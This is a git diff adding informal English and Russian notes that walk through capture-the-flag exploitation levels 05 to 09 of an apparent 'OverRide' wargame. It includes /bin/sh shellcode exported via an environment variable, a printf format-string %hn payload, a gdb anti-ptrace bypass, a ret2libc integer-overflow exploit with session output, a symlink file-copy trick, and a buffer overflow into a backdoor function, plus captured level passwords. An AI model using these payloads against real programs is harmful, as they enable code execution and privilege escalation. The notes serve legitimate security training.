@@ -350,8 +350,296 @@ buff addr (???)
 0x080497e8  data_start
 
 
-read this:
-https://github.com/anyaschukin/OverRide/blob/main/level05/README.md
+so first of all in this shit u cant execute stack, 
+
+
+https://en.wikipedia.org/wiki/Executable_space_protection
+
+google non executable stack for info, but tldr:
+
+dmesg | grep "Execute Disable"
+[    0.000000] NX (Execute Disable) protection: active
+
+https://access.redhat.com/solutions/2936741
+
+meaning we cant do the old good shit
+
+
+well we still need to put in some shellcode coz still no syscall with bin sh
+
+some googling gets me here:
+https://access.redhat.com/solutions/2936741
+where i get a fine advice of using env var for injecting shellcode.
+see, it's the memory addresses which are being checked for this kind of protection
+and env vars addresses are quite different from local stack addresses which allows us to well
+OVERRIDE the protection kek
+
+anyway, the general solution is the following:
+1. we need to export some shellcode as an env var
+2. we need to get its address
+3. as we will see further this address will be quite unwritebale with the usual int due to int overflow
+4. however, two short ints following each other will be written in memory following one another
+which will form the right address
+
+so lets go
+1. we need to export the shellcode, however, the program does some xor shit to each symbol in buffer which can alterante the shellcode (byez say its tolower but whateves). we don't want it touched so we need to skip the original buff.
+
+use the old generator (ask maxxon for that) to check the buff size. its a 100.
+so we need to add some 100 bytes to shellcode then we take its address.
+
+export PEPEGA=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
+
+check env vars in gdb:
+
+b *main+4
+r
+x/200s environ
+
+0xffffde70: // the address	 "PEPEGA=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\22---Type <return> to continue, or q <return> to quit---
+0\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
+
+
+0xffffde70 hex to decimal = 4294958704 // see, that's the int overflow i was talking about
+
+exit addr also should be split to write parts of shellcode addr in approprite mem
+
+currently on my machine the hex-to-dec value for addr is the following (may not work the same?):
+
+0xffff = 65535 // same
+0xde70 = 56944 //28894
+
+to that shit we need the following adjustments:
+- 8 bytes for ptr
+- characters already written
+
+
+making the digits the following: (56944 - 8) + (65535 - 56944) = 56936 + 8591
+
+
+
+for printf - the old boy %n specifier + width
+
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56936d%10$hn" + "%8591d%11$hn")'; cat) | ./level05
+
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+
+===========
+LEVEL06
+===========
+so the thing again asks for login and passwd
+
+info functions: noticable stuff
+	- printf //maybe overflow?
+	- some weird signals and alarms
+	- syscall // no shellcode here?
+	- ptrace //dafuq?
+	- auth //lets check this
+
+
+auth: after some time notice this 
+   0x08048866 <+286>:	cmp    -0x10(%ebp),%eax
+is this the same stuff as level00 kek?
+
+oh wow look at this
+.---------------------------.
+| !! TAMPERING DETECTED !!  |
+'---------------------------'
+[Inferior 1 (process 1862) exited with code 01]
+(gdb)
+
+ok, thats what ptrace does here.
+   0x080487ba <+114>:	cmp    $0xffffffff,%eax
+and this is where this shit happens
+
+so we get to this line in gdb and change eax val from -1 to 0, ((gdb) set $eax=0)
+then we can get to the cmp line
+
+set breakpoint at cmp
+chack whats compared: eax vs -0x10(%ebp)
+check value of -0x10(%ebp): 
+
+(gdb) x/d $ebp-0x10
+0xffffd5d8:	6232805
+(login pepega, passwd may be whatevs during gdb stuff)
+
+try the serial
+it works
+
+
+cat /home/users/level07/.pass
+GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8
+
+
+
+===========
+LEVEL07
+===========
+
+https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3
+https://shellblade.net/files/docs/ret2libc.pdf
+btw these articles are useful for all prev levels starting 05 (NX protection)
+https://undo.io/resources/gdb-watchpoint/how-search-byte-sequence-memory-gdb-command-find/ - find gdb
+
+Нас встречает программа: которая сохраняет в data table цифорки. Спустя недолгое время ресеча натыкаемся на тему Ret2Libc attack: https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3 , https://shellblade.net/files/docs/ret2libc.pdf . Первая статья буквально по шагово объясняет нам как пройти данный уровень. 
+
+Так же мы видим такой ряд функций:
+0x080485a0  frame_dummy
+0x080485c4  clear_stdin
+0x080485e7  get_unum
+0x0804861f  prog_timeout
+0x08048630  store_number - По любому здесь мы найдем адрес data table.
+0x080486d7  read_number
+0x08048723  main
+
+Нам необходимо:
+1. Найти адрес system
+2. Найти адрес exit
+3. Найти адрес "bin/sh"
+4. Найти адрес data table
+5. Найти eip адрес
+6. Реализовать эксплойт (arg 1 = system, arg 2 = exit, arg 3 = bin/sh)
+
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>  4159090384
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit> 4159040368
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec 4160264172
+
+Breakpoint 1, 0x08048729 in main ()
+(gdb) info frame
+Stack level 0, frame at 0xffffd650:
+ eip = 0x8048729 in main; saved eip 0xf7e45513
+ Saved registers:
+  ebp at 0xffffd648, eip at 0xffffd64c - наш eip
+
+
+End of assembler dump.
+(gdb) p $ebp+0x8
+$1 = (void *) 0xffffd460
+(gdb) x/a 0xffffd460
+0xffffd460:	0xffffd484 - data table addr
+
+0xffffd64c - 0xffffd484 = 456
+456 / 4(sizeof(uint)) = 114
+114 - protected (%3 == 0)
+then use uint max(2^32) + 114:
+1073741938
+1073741938 % 3 = 1
+
+
+Эксплойт:
+1) store
+	4159090384 (system)
+	1073741938 (114 index)
+2) store
+	4159040368 (exit)
+	115
+3) store
+	4160264172 (bin/sh)
+	116
+4) quit
+
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+===========
+LEVEL08
+===========
+
+level08@OverRide:~$ ./level08
+Usage: ./level08 filename
+ERROR: Failed to open (null)
+
+Нас встречает програ, которая на вход жрет файл
+и судя по info functions читает, и пишет в него что-то
+
+0x00000000004006f0  strcpy
+0x0000000000400700  write
+0x0000000000400710  fclose
+0x0000000000400730  printf
+0x0000000000400740  snprintf
+0x0000000000400750  strncat
+0x0000000000400760  fgetc
+0x0000000000400770  close
+0x0000000000400780  strcspn
+0x00000000004007a0  fprintf
+0x00000000004007b0  open
+0x00000000004007c0  fopen
+0x00000000004007d0  exit
+0x00000000004008a0  frame_dummy
+0x00000000004008c4  log_wrapper
+0x00000000004009f0  main
+
+Судя по всему он так же логгирует куда-то (log_wrapper)
+
+ls -la показывает, что есть папочка backups, которой владеет level09:
+drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
+
+В которой есть файл 
+-rwxrwx---+ 1 level09 users    24 Jun 13 14:43 .log
+
+КАРОЧ
+
+эта шляпа копирует файл в папку бэкапс. Если попробовать скопипастить файл .pass ничего и не выйдет
+А вот если создать на него ссылку (предварительно бахнув chmod себе в папку) - то его скопирует кек. И он будет уже от нашего юзера
+и откроется. Пароль 
+
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+
+
+===========
+LEVEL09
+===========
+
+This ones a combo of some prev levels.
+
+we have an uncalled function secret_backdoor(), that calls fgets for stuff and the calls sytem presumably with the input
+
+we need to use buff overflow to write this function's address just as we ve done before, the only difference really is 
+the usage of strncpy which means we also need to fuck up the max len value during overflow (well just put the max value in corresponding address)
+
+With pattern generator well find the required offset to write the address of secret_backdoor()
+finally we'll add "bin/sh" as input for s_b()
+
+
+(python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"'; cat) | ./level09
+
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
+
 
 
 
